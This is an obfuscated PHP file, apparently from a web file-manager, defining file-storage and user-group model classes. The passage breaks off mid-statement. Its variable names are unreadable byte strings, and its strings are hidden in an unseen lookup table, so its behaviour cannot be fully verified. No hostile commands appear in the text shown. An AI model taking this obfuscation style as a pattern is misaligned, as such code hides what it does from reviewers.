<?php
 goto a¸ ›ó; Fí™î•¶Ô¦: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\x6c\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\x65" => "\x69\157\x5f\x66\151\154\145\137\155\x65\164\x61", "\x6d\145\x74\x61\x46\151\x65\154\x64" => "\146\x69\154\145\111\x44"); public function fileInfo($ëØ”õŞ‡) { $×‹Ö…üù =& $_SERVER[³½¬ÚË¯]; static $ù¬…éüñ = array(); if (!isset($ù¬…éüñ[$ëØ”õŞ‡])) { $ˆ““ïß˜ = $×‹Ö…üù[1937]; $Œ°¤èÌù = Model($×‹Ö…üù[512])->field($ˆ““ïß˜)->where(array($×‹Ö…üù[510] => $ëØ”õŞ‡))->find(); $ù¬…éüñ[$ëØ”õŞ‡] = $Œ°¤èÌù; } return $ù¬…éüñ[$ëØ”õŞ‡]; } public function addFileByContent($´ü‘÷ú = '', $·÷èæ— = '') { $’¨İ¾şÃ =& $_SERVER[³½¬ÚË¯]; $˜ç‚¹´× = TEMP_PATH . $’¨İ¾şÃ[1938]; if (!is_dir($˜ç‚¹´×)) { mk_dir($˜ç‚¹´×); } $¯í¼õ¹ = $˜ç‚¹´× . $’¨İ¾şÃ[1939] . rand_string(16); file_put_contents($¯í¼õ¹, $´ü‘÷ú); $ò…‚Óí = $this->addFile($¯í¼õ¹, $·÷èæ—, !0); if (file_exists($¯í¼õ¹)) { @unlink($¯í¼õ¹); } return $ò…‚Óí; } public function createFileName($æ•÷Á¥, $›¶¦¡ó = false, $íÊˆ®±Ö = false) { $Æõ‚Ë•Ÿ =& $_SERVER[³½¬ÚË¯]; $èŠ¥‚« = IO::init($Æõ‚Ë•Ÿ[8]); $¿Ó¾úèó = $this->makeFilePath($æ•÷Á¥, $èŠ¥‚«, $›¶¦¡ó, $íÊˆ®±Ö); $àƒÆ­Â = $èŠ¥‚«->pathFather($¿Ó¾úèó); static $ƒÀ™Ó—æ = false; $‡ˆâ§Ÿ¢ = $Æõ‚Ë•Ÿ[1940] . md5($àƒÆ­Â); if (!$ƒÀ™Ó—æ && !Cache::get($‡ˆâ§Ÿ¢)) { $ƒÀ™Ó—æ = !0; $Í­“Éä° = IO::mkdir($àƒÆ­Â); if (!IO::exist($Í­“Éä° . $Æõ‚Ë•Ÿ[833])) { IO::mkfile($Í­“Éä° . $Æõ‚Ë•Ÿ[833]); } Cache::set($‡ˆâ§Ÿ¢, 1, 3600 * 2); } return $¿Ó¾úèó; } public function makeFilePath($’Î”£”³, $âÂ˜…Ê¤, $ìÈôİŠ = false, $ŸÆŠüĞ = false) { $Ü«¢î²ı =& $_SERVER[³½¬ÚË¯]; $¿ë‚ÖÀ‰ = Model($Ü«¢î²ı[806])->get($Ü«¢î²ı[1941]); $¡¯Ë“†Ï = KodIO::defaultIO() . date($Ü«¢î²ı[1942]); $«óø¨íú = $¡¯Ë“†Ï . rand_string(5) . short_id(100); $’Î”£”³ = str_replace($Ü«¢î²ı[8], $Ü«¢î²ı[11], KodIO::clear($’Î”£”³)); $ò·üõ³× = $âÂ˜…Ê¤->ext($’Î”£”³); if (!$’Î”£”³) { $¿ë‚ÖÀ‰ = $Ü«¢î²ı[1943]; } switch ($¿ë‚ÖÀ‰) { case $Ü«¢î²ı[1944]: $«óø¨íú = $«óø¨íú . $Ü«¢î²ı[10] . $âÂ˜…Ê¤->ext($’Î”£”³); if ($ò·üõ³× == $Ü«¢î²ı[1881]) { $«óø¨íú .= $Ü«¢î²ı[1249]; } break; case $Ü«¢î²ı[1945]: $ºç¥Ò´‹ = Model($Ü«¢î²ı[806])->get($Ü«¢î²ı[807]); $—ÊüñÒ¡ = substr(md5($Ü«¢î²ı[808] . $ºç¥Ò´‹ . date($Ü«¢î²ı[784])), 0, 8); $±¨“¬•± = KodIO::defaultDriver(); $¡¯Ë“†Ï = $Ü«¢î²ı[1280] . $±¨“¬•±[$Ü«¢î²ı[443]] . $Ü«¢î²ı[452] . date($Ü«¢î²ı[1946]) . $—ÊüñÒ¡ . $Ü«¢î²ı[8]; if ($ò·üõ³× == $Ü«¢î²ı[1881]) { $’Î”£”³ .= $Ü«¢î²ı[1249]; } $„İùäêò = $Ü«¢î²ı[1947] . $¡¯Ë“†Ï . $’Î”£”³; CacheLock::lock($„İùäêò); $«óø¨íú = $¡¯Ë“†Ï . $’Î”£”³; if (IO::exist($¡¯Ë“†Ï . $’Î”£”³)) { $…¡ŒãÄª = substr($’Î”£”³, 0, strlen($’Î”£”³) - strlen($ò·üõ³×)); $İ¥ËâŞ = $ŸÆŠüĞ ? substr($ŸÆŠüĞ, 0, 5) : ($ìÈôİŠ ? substr($ìÈôİŠ, 0, 5) : rand_string(5)); $«óø¨íú = $¡¯Ë“†Ï . $…¡ŒãÄª . $İ¥ËâŞ . $Ü«¢î²ı[10] . $ò·üõ³×; } if (IO::isTypeObject($«óø¨íú) && !IO::isUploadServer($«óø¨íú)) { if (IO::exist($«óø¨íú)) { return $«óø¨íú; } $´ãË¾½ = IO::setContent($«óø¨íú, $Ü«¢î²ı[12]); if (!$´ãË¾½) { show_json($Ü«¢î²ı[1948], !1); } } CacheLock::unlock($„İùäêò); break; case $Ü«¢î²ı[1943]: break; default: break; } return $«óø¨íú; } public function addFileByRemote($³ïâšşË, $Ìşò•Ş™, $³ÌßÜºÎ = array()) { $Âó·¹¤ú =& $_SERVER[³½¬ÚË¯]; if (!IO::exist($³ïâšşË)) { return !1; } $Ğ×™ÁÀ¹ = $³ÌßÜºÎ[$Âó·¹¤ú[515]] ? $³ÌßÜºÎ[$Âó·¹¤ú[515]] : $Âó·¹¤ú[12]; $õè“·õÑ = IO::hashMd5($³ïâšşË, $Ğ×™ÁÀ¹); $üÖÕ¯¿ = KodIO::defaultDriver(); $ ËÙØşš = array($Âó·¹¤ú[586] => IO::size($³ïâšşË), $Âó·¹¤ú[1949] => 1, $Âó·¹¤ú[462] => $Ìşò•Ş™, $Âó·¹¤ú[844] => $üÖÕ¯¿[$Âó·¹¤ú[443]], $Âó·¹¤ú[463] => $³ïâšşË, $Âó·¹¤ú[1950] => $³ÌßÜºÎ[$Âó·¹¤ú[641]] ? $³ÌßÜºÎ[$Âó·¹¤ú[641]] : IO::hashSimple($³ïâšşË), $Âó·¹¤ú[1951] => $õè“·õÑ ? $õè“·õÑ : $Ğ×™ÁÀ¹); if ($ üíıŒ¦ = $this->addFileCheckExist($ ËÙØşš[$Âó·¹¤ú[641]], $ ËÙØşš[$Âó·¹¤ú[515]], $ ËÙØşš[$Âó·¹¤ú[76]])) { return $ üíıŒ¦; } return $this->addFileData($ ËÙØşš); } private function addFileData($™ñ¤à®) { $Î“óÑáŸ =& $_SERVER[³½¬ÚË¯]; if (!$™ñ¤à®) { return !1; } $™ñ¤à®[$Î“óÑáŸ[76]] = intval($™ñ¤à®[$Î“óÑáŸ[76]]); if (!$™ñ¤à®[$Î“óÑáŸ[76]] && strlen($™ñ¤à®[$Î“óÑáŸ[641]]) > 32) { $™ñ¤à®[$Î“óÑáŸ[76]] = intval(substr($™ñ¤à®[$Î“óÑáŸ[641]], 32)); } $âşÑá = $this->add($™ñ¤à®); return $this->find($âşÑá); } public function addFile($°ü¼Ñ¸á, $šÃÉ¦¥ö, $„ù’·øÄ = false) { $Ù×”Ä‰ğ =& $_SERVER[³½¬ÚË¯]; $ú„‡Ìâœ = IO::hashSimple($°ü¼Ñ¸á); $±¯ƒ«óù = IO::size($°ü¼Ñ¸á); $‘õåĞĞä = $±¯ƒ«óù <= 1024 * 1024 * 10 ? IO::hashMd5($°ü¼Ñ¸á) : $Ù×”Ä‰ğ[12]; $¿ÚÚÙé = $Ù×”Ä‰ğ[1952] . $ú„‡Ìâœ; CacheLock::lock($¿ÚÚÙé); if ($‘õåĞĞä && $ú„‡Ìâœ) { $›ÑËé™ = $this->addFileCheckExist($ú„‡Ìâœ, $‘õåĞĞä, $±¯ƒ«óù); if ($›ÑËé™) { CacheLock::unlock($¿ÚÚÙé); return $›ÑËé™; } } $®îÆÕÅ• = $this->addFileMake($°ü¼Ñ¸á, $±¯ƒ«óù, $ú„‡Ìâœ, $‘õåĞĞä, $šÃÉ¦¥ö, $„ù’·øÄ); $®ã·é» = $this->addFileData($®îÆÕÅ•); CacheLock::unlock($¿ÚÚÙé); if (!$‘õåĞĞä && $®ã·é») { $this->fileMd5Check($®ã·é»); } return $®ã·é»; } public function fileMd5Check($  ‚«Û—) { $ÂóÎúˆÆ =& $_SERVER[³½¬ÚË¯]; $åè£ËÁÑ = array($  ‚«Û—[$ÂóÎúˆÆ[509]], $  ‚«Û—[$ÂóÎúˆÆ[84]]); $Õ¾¹ƒ·± = $ÂóÎúˆÆ[1953] . $  ‚«Û—[$ÂóÎúˆÆ[84]]; $ö•ñÀ°Ö = $ÂóÎúˆÆ[1954] . $  ‚«Û—[$ÂóÎúˆÆ[509]]; TaskQueue::add($ÂóÎúˆÆ[1955], $åè£ËÁÑ, $Õ¾¹ƒ·±, $ö•ñÀ°Ö); } public function fileMd5Set($²¥šç×Á, $ŸÚéÌôâ) { $„ó±Àîã =& $_SERVER[³½¬ÚË¯]; $¾…ƒäşÆ = $this->find($²¥šç×Á); if (!$¾…ƒäşÆ || $¾…ƒäşÆ[$„ó±Àîã[515]]) { return; } $Ğ¬‰øíß = IO::hashMd5($ŸÚéÌôâ); if (!$Ğ¬‰øíß) { return $„ó±Àîã[12]; } $this->where(array($„ó±Àîã[509] => $²¥šç×Á))->save(array($„ó±Àîã[515] => $Ğ¬‰øíß)); } public function addFileMake($şäœ†‘, $­½æìÔ, $Û•á‰Ë«, $­¼ùÜàğ, $çÎÎìÎÄ, $ŞÜ‚Î¯³) { $›„¾¬ş =& $_SERVER[³½¬ÚË¯]; $¥¢ÅÑ®Ğ = $this->createFileName($çÎÎìÎÄ, $Û•á‰Ë«, $­¼ùÜàğ); $å³Ú½±Î = get_path_father($¥¢ÅÑ®Ğ); $„Üì“ŸÎ = get_path_this($¥¢ÅÑ®Ğ); if ($ŞÜ‚Î¯³) { $Ø•‘êôÆ = IO::move($şäœ†‘, $å³Ú½±Î, !1, $„Üì“ŸÎ); } else { $Ø•‘êôÆ = IO::copy($şäœ†‘, $å³Ú½±Î, !1, $„Üì“ŸÎ); } if (!$Ø•‘êôÆ) { return !1; } $—×Ùòşê = KodIO::defaultDriver(); $Ô’ÂÑ¶Ç = array($›„¾¬ş[586] => $­½æìÔ, $›„¾¬ş[1949] => 1, $›„¾¬ş[462] => $çÎÎìÎÄ, $›„¾¬ş[844] => $—×Ùòşê[$›„¾¬ş[443]], $›„¾¬ş[463] => $¥¢ÅÑ®Ğ, $›„¾¬ş[1950] => $Û•á‰Ë«, $›„¾¬ş[1951] => $­¼ùÜàğ); return $Ô’ÂÑ¶Ç; } public function addFileCheckExist($‚Êïí³¥, $îÌ¨¾Ò¬, $Óôç½ª¥) { $£ÜÀî¤³ =& $_SERVER[³½¬ÚË¯]; $¤Â€•–ä = $this->findByHash($‚Êïí³¥, $îÌ¨¾Ò¬); if (!$¤Â€•–ä) { return !1; } $§š¼îô = array($£ÜÀî¤³[1949] => intval($¤Â€•–ä[$£ÜÀî¤³[1956]]) + 1, $£ÜÀî¤³[586] => $Óôç½ª¥); $this->where(array($£ÜÀî¤³[510] => $¤Â€•–ä[$£ÜÀî¤³[509]]))->save($§š¼îô); return $¤Â€•–ä; } public function remove($ä˜‡£×ä) { $this->linkCountChange($ä˜‡£×ä, !1); $this->clearEmpty(); return !0; } public function linkAdd($˜£”ô¡) { $this->linkCountChange($˜£”ô¡, !0); } public function linkCountChange($ç¥¯¿Å, $£â†Ì€ı) { $²ıŠ¯— =& $_SERVER[³½¬ÚË¯]; if (!$ç¥¯¿Å) { return; } if (!is_array($ç¥¯¿Å)) { $ç¥¯¿Å = array($ç¥¯¿Å); } $¤”´•¬ƒ = array(); foreach ($ç¥¯¿Å as $Ş•öÍ‡‚) { $Üˆ•¡½ = $Ş•öÍ‡‚ . $²ıŠ¯—[12]; if (!$¤”´•¬ƒ[$Üˆ•¡½]) { $¤”´•¬ƒ[$Üˆ•¡½] = 0; } $¤”´•¬ƒ[$Üˆ•¡½]++; } $Œ…€ëöÚ = array(); foreach ($¤”´•¬ƒ as $Ş•öÍ‡‚ => $±Œ¢ÃÆí) { $Üˆ•¡½ = $±Œ¢ÃÆí . $²ıŠ¯—[12]; if (!$Œ…€ëöÚ[$Üˆ•¡½]) { $Œ…€ëöÚ[$Üˆ•¡½] = array(); } $Œ…€ëöÚ[$Üˆ•¡½][] = $Ş•öÍ‡‚; } foreach ($Œ…€ëöÚ as $±Œ¢ÃÆí => $“ÈÎ¾À‹) { if (!$“ÈÎ¾À‹) { continue; } $±Œ¢ÃÆí = $£â†Ì€ı ? $±Œ¢ÃÆí : -intval($±Œ¢ÃÆí); $ªëşåå¤ = array($²ıŠ¯—[509] => array($²ıŠ¯—[7], $“ÈÎ¾À‹)); if ($±Œ¢ÃÆí < 0) { $ªëşåå¤[$²ıŠ¯—[1956]] = array($²ıŠ¯—[1058], abs($±Œ¢ÃÆí)); } $this->where($ªëşåå¤)->setAdd($²ıŠ¯—[1956], $±Œ¢ÃÆí); } } public function findByHash($‘´¶ÛĞĞ, $Îœä»ŞÖ = false) { $©±Ëè =& $_SERVER[³½¬ÚË¯]; if (!$‘´¶ÛĞĞ && !$Îœä»ŞÖ) { return !1; } $šéü»şà = array($©±Ëè[1950] => $‘´¶ÛĞĞ); if ($Îœä»ŞÖ) { $šéü»şà = array($©±Ëè[1951] => $Îœä»ŞÖ); } return $this->order($©±Ëè[1957])->where($šéü»şà)->find(); } public function clearEmpty($™–Äîß“ = 0) { $Ÿé›Œ­è =& $_SERVER[³½¬ÚË¯]; $•õŠóúª = time() - 3600 * 24 * $™–Äîß“; $®ù¿Ä·¡ = $Ÿé›Œ­è[1958] . $•õŠóúª; $® ŠÎİ = $this->where($®ù¿Ä·¡)->select(); if (!$® ŠÎİ) { return; } $¹“ÕØàè = new Task($Ÿé›Œ­è[1959], $Ÿé›Œ­è[12], count($® ŠÎİ)); foreach ($® ŠÎİ as $ıŠ¤±±) { $¹“ÕØàè->update(1); $this->resetFile($ıŠ¤±±); } $¹“ÕØàè->end(); } public function resetFile($àÔ£¦Ë) { $‰â“”±¬ =& $_SERVER[³½¬ÚË¯]; $ú˜ã™¬¾ = array($‰â“”±¬[510] => $àÔ£¦Ë[$‰â“”±¬[509]]); $¼íøŸêú = Model($‰â“”±¬[1375])->where($ú˜ã™¬¾)->count(); $—ºã™™» = Model($‰â“”±¬[1960])->where($ú˜ã™¬¾)->count(); $¿³£ ÜË = intval($¼íøŸêú) + intval($—ºã™™»); if ($¿³£ ÜË == 0) { IO::remove($àÔ£¦Ë[$‰â“”±¬[84]]); Model($‰â“”±¬[1961])->delete($àÔ£¦Ë[$‰â“”±¬[509]]); $this->where($ú˜ã™¬¾)->delete(); $this->metaSet($àÔ£¦Ë[$‰â“”±¬[509]], null, null); return; } if ($àÔ£¦Ë[$‰â“”±¬[1956]] != $¿³£ ÜË) { $this->where($ú˜ã™¬¾)->save(array($‰â“”±¬[1949] => $¿³£ ÜË)); } } public function storageInfo($ÙŞóÂû = false) { $Å¥ùĞáÄ =& $_SERVER[³½¬ÚË¯]; $´Ìçë®É = $this->count() + 0.0; $ëŸ½£ûÁ = 0; $’úéÆÂ = 1; $ƒ„ÊŞßˆ = 0; $Ü«ïë­é = 5000; for ($Ê±€˜Ù™ = 0; $Ê±€˜Ù™ < $´Ìçë®É; $Ê±€˜Ù™ = $Ê±€˜Ù™ + $Ü«ïë­é) { $õü¿­òß = $this->limit($Ê±€˜Ù™, $Ê±€˜Ù™ + $Ü«ïë­é)->select(); foreach ($õü¿­òß as $ÚšÜÂØ) { $’úéÆÂ += $ÚšÜÂØ[$Å¥ùĞáÄ[76]] * $ÚšÜÂØ[$Å¥ùĞáÄ[1956]]; $ëŸ½£ûÁ += $ÚšÜÂØ[$Å¥ùĞáÄ[76]] * ($ÚšÜÂØ[$Å¥ùĞáÄ[1956]] - 1); $ƒ„ÊŞßˆ += $ÚšÜÂØ[$Å¥ùĞáÄ[1956]]; } } $Ø¾Ë±¿š = array($Å¥ùĞáÄ[1962] => $’úéÆÂ, $Å¥ùĞáÄ[1963] => $ëŸ½£ûÁ, $Å¥ùĞáÄ[1964] => $ëŸ½£ûÁ / $’úéÆÂ, $Å¥ùĞáÄ[80] => $´Ìçë®É, $Å¥ùĞáÄ[1965] => $ƒ„ÊŞßˆ); return $Ø¾Ë±¿š; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\160"; protected $tableMeta = array("\164\141\142\x6c\145\116\x61\155\145" => "\x67\162\157\165\x70\x5f\155\x65\x74\141", "\x6d\x65\x74\141\106\151\145\154\144" => "\x67\162\157\165\x70\x49\x44"); protected function cacheFunctionAlias($İÚ¶úè) { $¬¬ñ§ËØ =& $_SERVER[³½¬ÚË¯]; return array($¬¬ñ§ËØ[1966] => array($İÚ¶úè[0], $¬¬ñ§ËØ[1967]), $¬¬ñ§ËØ[1968] => array($İÚ¶úè[0], $¬¬ñ§ËØ[1969])); } protected function getInfo($Ôâ«·ò°, $üòçâ° = false) { $öøŒÕË÷ = $this->getInfoSimple($Ôâ«·ò°); if (!$öøŒÕË÷) { return !1; } if ($üòçâ°) { return $this->_listDataApplyItem($öøŒÕË÷); } return $this->cacheFunctionGet($_SERVER[³½¬ÚË¯][1970], $Ôâ«·ò°); } protected function getInfoSimple($ˆğÖÛ¦Ğ, $ş¥ÛÖˆğ = false) { $ìµĞâ¯ =& $_SERVER[³½¬ÚË¯]; if ($ş¥ÛÖˆğ) { $Ñµ»¦™± = array($ìµĞâ¯[1888] => intval($ˆğÖÛ¦Ğ)); $Â¾Ú¬“ = $this->where($Ñµ»¦™±)->find(); return is_array($Â¾Ú¬“) ? $Â¾Ú¬“ : array(); } return $this->cacheFunctionGet($ìµĞâ¯[1971], $ˆğÖÛ¦Ğ); } protected function groupAdd($Ñ÷°Û) { $‹Ä¶ˆ—¹ =& $_SERVER[³½¬ÚË¯]; if (!$Ñ÷°Û[$‹Ä¶ˆ—¹[180]] && isset($Ñ÷°Û[$‹Ä¶ˆ—¹[1888]]) && $Ñ÷°Û[$‹Ä¶ˆ—¹[1888]] == 1) { if ($Ò®ÒÂÛ = $this->getInfoSimple($Ñ÷°Û[$‹Ä¶ˆ—¹[1888]], !0)) { return $Ñ÷°Û[$‹Ä¶ˆ—¹[1888]]; } } else { $Ò®ÒÂÛ = $this->getInfoSimple($Ñ÷°Û[$‹Ä¶ˆ—¹[180]]); if (!$Ò®ÒÂÛ) { return !1; } } $ìœëï÷© = $‹Ä¶ˆ—¹[564]; if ($Ò®ÒÂÛ[$‹Ä¶ˆ—¹[554]]) { $ìœëï÷© = $Ò®ÒÂÛ[$‹Ä¶ˆ—¹[554]] . $Ò®ÒÂÛ[$‹Ä¶ˆ—¹[1888]] . $‹Ä¶ˆ—¹[50]; } $ı³¿ä¾† = array($‹Ä¶ˆ—¹[462] => $this->groupNameAuto($Ñ÷°Û[$‹Ä¶ˆ—¹[180]], $Ñ÷°Û[$‹Ä¶ˆ—¹[32]]), $‹Ä¶ˆ—¹[445] => $Ñ÷°Û[$‹Ä¶ˆ—¹[180]], $‹Ä¶ˆ—¹[621] => $ìœëï÷©, $‹Ä¶ˆ—¹[1972] => $Ñ÷°Û[$‹Ä¶ˆ—¹[1875]], $‹Ä¶ˆ—¹[1973] => 0, $‹Ä¶ˆ—¹[1892] => 0); if (isset($Ñ÷°Û[$‹Ä¶ˆ—¹[1912]])) { $ı³¿ä¾†[$‹Ä¶ˆ—¹[1912]] = $Ñ÷°Û[$‹Ä¶ˆ—¹[1912]]; } else { $ÎÂˆÆôõ = $this->max($‹Ä¶ˆ—¹[1912]); if (!$ÎÂˆÆôõ) { $ÎÂˆÆôõ = 0; } $ı³¿ä¾†[$‹Ä¶ˆ—¹[1912]] = $ÎÂˆÆôõ + 1; } if (!empty($Ñ÷°Û[$‹Ä¶ˆ—¹[1888]])) { $ı³¿ä¾†[$‹Ä¶ˆ—¹[1888]] = $Ñ÷°Û[$‹Ä¶ˆ—¹[1888]]; } $é¤“ª‘Ò = $this->add($ı³¿ä¾†); $this->setNamePinyin($é¤“ª‘Ò, $ı³¿ä¾†[$‹Ä¶ˆ—¹[32]]); if (isset($Ñ÷°Û[$‹Ä¶ˆ—¹[1974]])) { $this->metaSet($é¤“ª‘Ò, array($‹Ä¶ˆ—¹[1974] => $Ñ÷°Û[$‹Ä¶ˆ—¹[1974]], $‹Ä¶ˆ—¹[1975] => $Ñ÷°Û[$‹Ä¶ˆ—¹[1975]])); unset($Ñ÷°Û[$‹Ä¶ˆ—¹[1974]]); unset($Ñ÷°Û[$‹Ä¶ˆ—¹[1975]]); } Model($‹Ä¶ˆ—¹[1375])->groupRootAdd($é¤“ª‘Ò); $this->_clearCache($Ñ÷°Û[$‹Ä¶ˆ—¹[180]]); return $é¤“ª‘Ò; } protected function groupEdit($Ûò¯åî¹, $ó¨ëûØÈ) { $†½ Ô³¤ =& $_SERVER[³½¬ÚË¯]; $¡“Ñ†°í = $this->getInfoSimple($Ûò¯åî¹); if (!$¡“Ñ†°í) { return !1; } if (!empty($ó¨ëûØÈ[$†½ Ô³¤[180]])) { $¥ºí¿‹µ = $this->getInfoSimple($ó¨ëûØÈ[$†½ Ô³¤[180]]); if (!$¥ºí¿‹µ) { return !1; } if ($¡“Ñ†°í[$†½ Ô³¤[1888]] == $¥ºí¿‹µ[$†½ Ô³¤[1888]]) { return !1; } if ($ó¨ëûØÈ[$†½ Ô³¤[180]] != $¡“Ñ†°í[$†½ Ô³¤[180]]) { if ($¥ºí¿‹µ[$†½ Ô³¤[554]] !== $¡“Ñ†°í[$†½ Ô³¤[554]] && strpos($¥ºí¿‹µ[$†½ Ô³¤[554]], $¡“Ñ†°í[$†½ Ô³¤[554]] . $¡“Ñ†°í[$†½ Ô³¤[1888]] . $†½ Ô³¤[50]) === 0) { return !1; } $ó¨ëûØÈ[$†½ Ô³¤[621]] = $¥ºí¿‹µ[$†½ Ô³¤[554]] . $ó¨ëûØÈ[$†½ Ô³¤[180]] . $†½ Ô³¤[50]; $this->_changeChildLevel($¡“Ñ†°í, $¥ºí¿‹µ); $this->_clearCache($¥ºí¿‹µ[$†½ Ô³¤[1888]]); $this->_clearCache($¡“Ñ†°í[$†½ Ô³¤[180]]); } } if (isset($ó¨ëûØÈ[$†½ Ô³¤[32]])) { $this->setNamePinyin($Ûò¯åî¹, $ó¨ëûØÈ[$†½ Ô³¤[32]]); } if (isset($ó¨ëûØÈ[$†½ Ô³¤[1974]])) { $this->metaSet($Ûò¯åî¹, array($†½ Ô³¤[1974] => $ó¨ëûØÈ[$†½ Ô³¤[1974]], $†½ Ô³¤[1975] => $ó¨ëûØÈ[$†½ Ô³¤[1975]])); unset($ó¨ëûØÈ[$†½ Ô³¤[1974]]); unset($ó¨ëûØÈ[$†½ Ô³¤[1975]]); } $this->_clearChildrenCache($¡“Ñ†°í); return $this->where(array($†½ Ô³¤[1976] => $Ûò¯åî¹))->save($ó¨ëûØÈ); } private function _clearChildrenCache($›†„¸…‚) { $·‘¹ôœ =& $_SERVER[³½¬ÚË¯]; $Œëéè˜ = array($·‘¹ôœ[621] => array($·‘¹ôœ[581], $›†„¸…‚[$·‘¹ôœ[554]] . $›†„¸…‚[$·‘¹ôœ[1888]] . $·‘¹ôœ[582])); $ˆóŞöÊé = $this->field($·‘¹ôœ[1888])->where($Œëéè˜)->select(); foreach ($ˆóŞöÊé as $½Ç€ï†›) { $this->_clearCache($½Ç€ï†›[$·‘¹ôœ[1888]]); } } private function _clearCache($ùÓŞ§‡Æ) { $ì÷ôÍ§ =& $_SERVER[³½¬ÚË¯]; $this->cacheFunctionClear($ì÷ôÍ§[1970], $ùÓŞ§‡Æ); $this->cacheFunctionClear($ì÷ôÍ§[1971], $ùÓŞ§‡Æ); } private function _changeChildLevel($¬ˆÌ½Ùğ, $÷‹Â¨Î¨, $ÅËÔÙÑ = false) { $Ÿõ×±¼„ =& $_SERVER[³½¬ÚË¯]; $¾òÛ¨¥¢ = $¬ˆÌ½Ùğ[$Ÿõ×±¼„[554]] . $¬ˆÌ½Ùğ[$Ÿõ×±¼„[1888]] . $Ÿõ×±¼„[50]; $¯¦ÑÕØÖ = $÷‹Â¨Î¨[$Ÿõ×±¼„[554]] . $÷‹Â¨Î¨[$Ÿõ×±¼„[1888]] . $Ÿõ×±¼„[50] . $¬ˆÌ½Ùğ[$Ÿõ×±¼„[1888]] . $Ÿõ×±¼„[50]; if ($ÅËÔÙÑ) { $¯¦ÑÕØÖ = $÷‹Â¨Î¨[$Ÿõ×±¼„[554]] . $÷‹Â¨Î¨[$Ÿõ×±¼„[1888]] . $Ÿõ×±¼„[50]; } $ÊØÀ­ = array($Ÿõ×±¼„[621] => array($Ÿõ×±¼„[581], $¬ˆÌ½Ùğ[$Ÿõ×±¼„[554]] . $¬ˆÌ½Ùğ[$Ÿõ×±¼„[1888]] . $Ÿõ×±¼„[582])); $‚ÈÚã¸ù = array($Ÿõ×±¼„[621] => array($Ÿõ×±¼„[630], "\x72\145\160\x6c\141\143\145\50\x70\x61\x72\x65\x6e\x74\x4c\145\166\x65\x6c\x2c\x27{$¾òÛ¨¥¢}\47\54\x27{$¯¦ÑÕØÖ}\x27\x29")); $this->_clearChildrenCache($¬ˆÌ½Ùğ); $this->where($ÊØÀ­)->data($‚ÈÚã¸ù)->save(); } public function setNamePinyin($Õ€ĞÑóÑ, $ìÚ‘ô¬ = false) { $¿İÅşĞ =& $_SERVER[³½¬ÚË¯]; if (!$ìÚ‘ô¬) { $É‡©Ÿ¢Ï = $this->getInfoSimple($Õ€ĞÑóÑ); $ìÚ‘ô¬ = $É‡©Ÿ¢Ï[$¿İÅşĞ[32]]; } if (!Input::check($ìÚ‘ô¬, $¿İÅşĞ[624])) { $this->metaSet($Õ€ĞÑóÑ, $¿İÅşĞ[506], null); $this->metaSet($Õ€ĞÑóÑ, $¿İÅşĞ[505], null); return; } $—ˆ¹Ö¢ = array($¿İÅşĞ[506] => str_replace($¿İÅşĞ[53], $¿İÅşĞ[12], Pinyin::get($ìÚ‘ô¬)), $¿İÅşĞ[505] => Pinyin::get($ìÚ‘ô¬, $¿İÅşĞ[625])); $this->metaSet($Õ€ĞÑóÑ, $—ˆ¹Ö¢); } protected function groupStatus($üŠ÷Àô©, $ ÷Èš¼) { $å Ÿ“³‚ =& $_SERVER[³½¬ÚË¯]; $äŒõª = $this->getInfoSimple($üŠ÷Àô©); if (!$äŒõª) { return !1; } if ($ ÷Èš¼ == $å Ÿ“³‚[88]) { $åªè£ª = $this->parentLevelArray($äŒõª[$å Ÿ“³‚[554]]); } else { $ş„îÙˆâ = array($å Ÿ“³‚[621] => array($å Ÿ“³‚[581], $äŒõª[$å Ÿ“³‚[554]] . $äŒõª[$å Ÿ“³‚[1888]] . $å Ÿ“³‚[582])); $åªè£ª = $this->where($ş„îÙˆâ)->field($å Ÿ“³‚[1888])->select(); $åªè£ª = array_to_keyvalue($åªè£ª, $å Ÿ“³‚[12], $å Ÿ“³‚[1888]); } $åªè£ª[] = $äŒõª[$å Ÿ“³‚[1888]]; $„ÉÒË‰ß = array(); foreach ($åªè£ª as $üŠ÷Àô©) { $„ÉÒË‰ß[] = array($å Ÿ“³‚[1888] => $üŠ÷Àô©, $å Ÿ“³‚[94] => $å Ÿ“³‚[786], $å Ÿ“³‚[418] => $ ÷Èš¼); $this->_clearCache($üŠ÷Àô©); } return Model($å Ÿ“³‚[1977])->addAll($„ÉÒË‰ß, array(), !0); } protected function groupRemove($ºó’éàµ, $õ©Ì³Ùä = false) { $ï»ì‹Ÿ« =& $_SERVER[³½¬ÚË¯]; $„Ï×ˆ†ô = array($ï»ì‹Ÿ«[1888] => $ºó’éàµ); $«ïïÛ™ò = $this->where($„Ï×ˆ†ô)->find(); if (!$«ïïÛ™ò || $«ïïÛ™ò[$ï»ì‹Ÿ«[180]] == 0) { return !1; } if (!$õ©Ì³Ùä) { $Ò±ùÅÃ = $this->getInfoSimple($«ïïÛ™ò[$ï»ì‹Ÿ«[180]]); $this->_changeChildLevel($«ïïÛ™ò, $Ò±ùÅÃ, !0); $this->where(array($ï»ì‹Ÿ«[180] => $ºó’éàµ))->save(array($ï»ì‹Ÿ«[180] => $«ïïÛ™ò[$ï»ì‹Ÿ«[180]])); $this->_clearCache($Ò±ùÅÃ[$ï»ì‹Ÿ«[1888]]); } Model($ï»ì‹Ÿ«[1977])->where($„Ï×ˆ†ô)->delete(); Model($ï»ì‹Ÿ«[1978])->where($„Ï×ˆ†ô)->delete(); Model($ï»ì‹Ÿ«[861])->groupRootRemove($ºó’éàµ); $this->_clearCache($«ïïÛ™ò[$ï»ì‹Ÿ«[180]]); return $this->where($„Ï×ˆ†ô)->delete(); } protected function groupSort($Ã…¶İ¼Ş) { $™Ãµ =& $_SERVER[³½¬ÚË¯]; $¦»ÜÓá = array(); foreach ($Ã…¶İ¼Ş as $Œõºå“½ => $í÷²ºü ) { $¦»ÜÓá[] = array($™Ãµ[1888], $í÷²ºü , $™Ãµ[1912], $Œõºå“½ + 1); } $this->saveAll($¦»ÜÓá); } public function listData() { $Õ³…™æ² = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Õ³…™æ²[$_SERVER[³½¬ÚË¯][413]]); return $Õ³…™æ²; } private function _makeOrder($£ÆÓû© = '') { $×ÛÕÙ–ç =& $_SERVER[³½¬ÚË¯]; $Äî½ãÍ = array($×ÛÕÙ–ç[1888], $×ÛÕÙ–ç[32], $×ÛÕÙ–ç[1877], 